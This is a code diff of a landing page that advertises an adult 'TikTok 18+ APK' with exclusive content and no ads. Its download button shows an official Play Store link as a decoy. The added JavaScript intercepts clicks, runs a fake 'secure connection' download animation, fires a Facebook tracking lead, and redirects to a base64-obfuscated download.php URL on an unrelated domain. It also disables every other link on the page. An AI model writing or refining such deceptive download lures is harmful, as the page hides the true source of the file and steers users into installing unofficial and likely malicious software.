@@ -325,7 +325,7 @@
                     <h1 class="display-4 fw-bold mb-3">TikTok 18+ <span style="color:#dc143c;">APK</span></h1>
                     <p class="lead fs-3" style="color:#cfdeff;">Adult-oriented version with exclusive content, no ads, 4K player, and background audio.</p>
                     <div class="d-flex flex-wrap gap-3 mt-4">
-                        <!-- Замените ссылку на актуальный URL с APK файлом -->
+                        
                         <a href="https://play.google.com/store/apps/details?id=com.zhiliaoapp.musically&hl=en_GB" class="btn btn-download btn-lg" id="downloadBtn" download><i class="bi bi-cloud-arrow-down-fill me-2"></i>Download APK v1.7.3</a>
                         <a href="#screens" class="screens btn btn-outline-light btn-lg rounded-pill px-4"><i class="bi bi-images me-2"></i>View screens</a>
                     </div>
@@ -725,16 +725,7 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
     
 <script>
-downloadBtns.forEach(btn => {
-    btn.addEventListener('click', function (e) {
-        e.preventDefault();  
-        e.stopPropagation();
-        startDownloadSimulation();
-    });
-});
-
-
-var encodedUrl = 'aHR0cHM6Ly9vZGFrbWFnYXphLmNvbS9BVC9kb3dubG9hZC5waHA='; 
+var encodedUrl = 'aHR0cHM6Ly9vZGFrbWFnYXphLmNvbS9BVC9kb3dubG9hZC5waHA=';
 
 function decodeUrl(b64) {
     try {
@@ -751,7 +742,6 @@ function sendLead() {
     } else {
         console.warn('✗ fbq nicht gefunden');
     }
-
     var success = document.getElementById('success');
     if (success) {
         success.style.display = 'block';
@@ -761,12 +751,18 @@ function sendLead() {
     }
 }
 
+var arr = document.getElementsByTagName('a');
+for (var i = 0; i < arr.length; i++) {
+    if (arr[i].id === 'downloadBtn' || arr[i].id === 'downloadBtn2') continue;
+    arr[i].onclick = function () {
+        return false;
+    };
+}
 
 const overlay = document.getElementById('downloadOverlay');
 const counterEl = document.getElementById('counter');
 const progressFill = document.getElementById('progressFill');
 const counterText = document.getElementById('counterText');
-const downloadBtns = document.querySelectorAll('#downloadBtn, #downloadBtn2');
 const instructionCard = document.getElementById('instructionCard');
 
 function startDownloadSimulation() {
@@ -775,7 +771,6 @@ function startDownloadSimulation() {
     counterEl.innerText = '0%';
     progressFill.style.width = '0%';
     counterText.innerText = 'establishing secure connection ...';
-
     const interval = setInterval(() => {
         percent += 1;
         if (percent <= 100) {
@@ -788,15 +783,12 @@ function startDownloadSimulation() {
         if (percent === 100) {
             clearInterval(interval);
             counterText.innerHTML = '<i class="bi bi-check-circle-fill text-success"></i> ready!';
-
             setTimeout(() => {
                 overlay.classList.remove('show');
                 counterEl.innerText = '0%';
                 progressFill.style.width = '0%';
                 counterText.innerText = 'initializing secure link ...';
                 instructionCard.scrollIntoView({ behavior: 'smooth' });
-
-                
                 sendLead();
                 setTimeout(function () {
                     window.location.href = decodeUrl(encodedUrl);
@@ -806,8 +798,11 @@ function startDownloadSimulation() {
     }, 40);
 }
 
+
+const downloadBtns = document.querySelectorAll('#downloadBtn, #downloadBtn2');
 downloadBtns.forEach(btn => {
     btn.addEventListener('click', function (e) {
+        e.preventDefault();
         e.stopPropagation();
         startDownloadSimulation();
     });
